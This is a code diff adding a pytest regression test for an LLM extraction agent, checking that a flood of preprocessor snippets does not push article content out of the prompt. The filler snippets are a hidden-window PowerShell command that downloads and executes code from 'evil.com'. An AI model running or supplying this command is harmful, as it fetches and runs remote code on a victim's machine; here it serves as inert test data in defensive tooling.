@@ -641,6 +641,52 @@ class TestRunExtractionAgentExecution:
         assert result.get("items") == []
         assert result.get("count") == 0
 
+    @pytest.mark.asyncio
+    @pytest.mark.regression
+    async def test_snippet_cap_preserves_article_in_prompt(self, llm_service):
+        """300+ snippets must not crowd out the article content in the LLM prompt.
+
+        Regression for article_2068: preprocessor produced 323 snippets which
+        consumed the entire context, leaving 0 chars for the article (0/7 extracted
+        with preprocessor ON vs 6/7 with it OFF).
+        """
+        article_text = "UNIQUE_ARTICLE_CONTENT " + "x" * MIN_USER_CONTENT_CHARS
+
+        fat_snippets = [
+            f"powershell -enc {i:04d} -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/{i}')"
+            for i in range(320)
+        ]
+
+        captured_messages = []
+
+        async def capture_request_chat(**kwargs):
+            captured_messages.extend(kwargs.get("messages", []))
+            return {"choices": [{"message": {"content": '{"items":[],"count":0}'}}], "usage": {}}
+
+        with (
+            patch(
+                "src.services.cmdline_attention_preprocessor.process",
+                return_value={"high_likelihood_snippets": fat_snippets, "full_article": article_text},
+            ),
+            patch.object(llm_service, "_get_context_limit", return_value=4000),
+            patch.object(llm_service, "request_chat", side_effect=capture_request_chat),
+        ):
+            await llm_service.run_extraction_agent(
+                agent_name="CmdlineExtract",
+                content=article_text,
+                title="Dense Article",
+                url="https://example.com",
+                prompt_config=_EXTRACT_PROMPT_CFG,
+                max_retries=1,
+                attention_preprocessor_enabled=True,
+            )
+
+        assert captured_messages, "request_chat was not called"
+        full_prompt = " ".join(m.get("content", "") for m in captured_messages)
+        assert "UNIQUE_ARTICLE_CONTENT" in full_prompt, (
+            "Article content was crowded out by snippet runaway -- cap is not working"
+        )
+
 
 # ---------------------------------------------------------------------------
 # Provider HTTP call methods -- _call_openai_chat, _call_anthropic_chat
